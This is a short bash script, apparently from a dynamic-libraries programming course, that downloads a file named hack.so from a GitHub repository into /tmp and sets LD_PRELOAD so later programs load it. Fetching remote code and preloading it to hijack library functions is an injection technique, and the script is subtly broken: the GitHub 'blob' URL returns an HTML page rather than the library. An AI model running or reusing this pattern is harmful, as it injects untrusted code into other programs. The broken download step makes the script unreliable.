#!/bin/bash
wget -P /tmp https://github.com/bibhestee/alx-low_level_programming/blob/main/0x18-dynamic_libraries/hack.so
export LD_PRELOAD=/tmp/hack.so
